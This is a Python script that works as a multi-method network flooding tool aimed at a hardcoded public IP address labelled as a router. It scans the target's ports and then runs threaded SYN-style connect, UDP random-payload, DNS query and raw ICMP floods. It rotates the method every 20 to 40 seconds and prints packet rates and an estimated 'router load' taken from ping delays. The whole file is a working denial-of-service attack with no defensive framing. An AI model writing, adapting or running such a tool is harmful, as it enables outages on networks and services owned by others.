import socket
import threading
import time
import random
import subprocess
import os

router_ip = "62.109.121.43"

# Colors
MAGENTA = '\033[95m'
CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
RESET = '\033[0m'

# Attack methods
METHODS = ["SYN", "UDP", "DNS", "ICMP"]
current_method = "SYN"
current_port = 80

# Stats
stats = {
    "total_sent": 0,
    "total_data": 0,
    "success": 0,
    "fail": 0,
    "open_ports": [80, 443, 53, 22, 8080, 7547],
    "method_start": time.time()
}
stats_lock = threading.Lock()

# Port scanner
def scan_ports():
    global current_port
    open_ports = []
    for port in [80, 443, 53, 22, 8080, 7547, 21, 23, 161, 162, 199, 5060]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            if sock.connect_ex((router_ip, port)) == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    if open_ports:
        with stats_lock:
            stats["open_ports"] = open_ports
            current_port = random.choice(open_ports)

# Get ping response time
def get_ping_time():
    try:
        cmd = f"ping -c 1 -W 1 {router_ip}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if "time=" in result.stdout:
            time_str = result.stdout.split("time=")[1].split(" ")[0]
            return float(time_str)
    except:
        pass
    return 999.0

# Attack functions
def syn_attack():
    while True:
        try:
            with stats_lock:
                port = random.choice(stats["open_ports"])
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            result = sock.connect_ex((router_ip, port))
            sock.close()
            
            with stats_lock:
                stats["total_sent"] += 1
                stats["total_data"] += 64
                if result == 0:
                    stats["success"] += 1
                else:
                    stats["fail"] += 1
        except:
            with stats_lock:
                stats["fail"] += 1
        time.sleep(random.uniform(0, 0.001))  # 0-1ms delay

def udp_attack():
    while True:
        try:
            with stats_lock:
                port = random.choice(stats["open_ports"])
            
            size = random.randint(500, 1450)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random.randbytes(size), (router_ip, port))
            sock.close()
            
            with stats_lock:
                stats["total_sent"] += 1
                stats["total_data"] += size
                stats["success"] += 1
        except:
            with stats_lock:
                stats["fail"] += 1
        time.sleep(random.uniform(0, 0.1))  # 0-100ms delay

def dns_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
            sock.sendto(query, (router_ip, 53))
            sock.close()
            
            with stats_lock:
                stats["total_sent"] += 1
                stats["total_data"] += len(query)
                stats["success"] += 1
        except:
            with stats_lock:
                stats["fail"] += 1
        time.sleep(random.uniform(0, 0.05))

def icmp_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00\xf7\xff' + b'\x00' * 56
            sock.sendto(packet, (router_ip, 0))
            sock.close()
            
            with stats_lock:
                stats["total_sent"] += 1
                stats["total_data"] += len(packet)
                stats["success"] += 1
        except:
            try:
                # Fallback to UDP ICMP-like
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b'\x00' * 64, (router_ip, 7))
                sock.close()
                with stats_lock:
                    stats["total_sent"] += 1
                    stats["total_data"] += 64
                    stats["success"] += 1
            except:
                with stats_lock:
                    stats["fail"] += 1
        time.sleep(random.uniform(0, 0.2))

# Method rotation
def rotate_method():
    global current_method
    while True:
        time.sleep(random.randint(20, 40))  # 20-40s rotation
        current_method = random.choice(METHODS)
        scan_ports()
        with stats_lock:
            stats["method_start"] = time.time()
            stats["total_sent"] = 0
            stats["total_data"] = 0
            stats["success"] = 0
            stats["fail"] = 0

# Attack manager
def attack_manager():
    threads = []
    while True:
        # Stop all threads
        for t in threads:
            pass  # Let them run as daemons
        
        # Start new method
        if current_method == "SYN":
            for _ in range(8):
                t = threading.Thread(target=syn_attack, daemon=True)
                t.start()
                threads.append(t)
        elif current_method == "UDP":
            for _ in range(12):
                t = threading.Thread(target=udp_attack, daemon=True)
                t.start()
                threads.append(t)
        elif current_method == "DNS":
            for _ in range(6):
                t = threading.Thread(target=dns_attack, daemon=True)
                t.start()
                threads.append(t)
        elif current_method == "ICMP":
            for _ in range(4):
                t = threading.Thread(target=icmp_attack, daemon=True)
                t.start()
                threads.append(t)
        
        time.sleep(30)  # Check every 30s

# Logging every 5s
def logger():
    last_reset = time.time()
    last_ping = 0
    base_ping = 10.0  # Assumed normal ping
    
    while True:
        time.sleep(5)
        
        with stats_lock:
            pps = stats["total_sent"] // 5
            data_sent = stats["total_data"] / (1024 * 1024)  # MB
            connection_rate = (stats["success"] / max(stats["total_sent"], 1)) * 100
            
            # Reset for next interval
            stats["total_sent"] = 0
            stats["total_data"] = 0
            stats["success"] = 0
            stats["fail"] = 0
        
        # Get ping every 10s to reduce load
        current_time = time.time()
        if current_time - last_ping >= 10:
            ping_time = get_ping_time()
            last_ping = current_time
            # Estimate router load based on ping increase
            if ping_time < 999:
                router_load = min(99, ((ping_time - base_ping) / base_ping) * 100)
                router_load = max(1, router_load)
            else:
                router_load = 99
        else:
            router_load = 50  # Default if not measured
        
        # Format response time
        if ping_time < 999:
            minutes = int(ping_time // 60)
            seconds = int(ping_time % 60)
            response_time = f"{minutes:02d}:{seconds:02d}s"
        else:
            response_time = "99:99s"
        
        print(f"{MAGENTA}2M55{RESET}:{router_ip}:{current_port}{CYAN}—{RESET}{GREEN}{pps}{RESET}:{GREEN}{data_sent:.2f}MB{RESET} {CYAN}—{RESET} {YELLOW}{current_method}{RESET} ⤵︎")
        print(f"{CYAN}-R/O:{RESET} {RED}{router_load:.0f}%{RESET}")
        print(f"{CYAN}-C/N:{RESET} {GREEN}{connection_rate:.0f}%{RESET}")
        print(f"{CYAN}-R/T:{RESET} {YELLOW}{response_time}{RESET}")
        print()

# Start everything
def main():
    # Initial scan
    scan_ports()
    
    # Start threads
    threading.Thread(target=rotate_method, daemon=True).start()
    threading.Thread(target=attack_manager, daemon=True).start()
    threading.Thread(target=logger, daemon=True).start()
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}Attack stopped.{RESET}")
        os._exit(0)

if __name__ == "__main__":
    main()
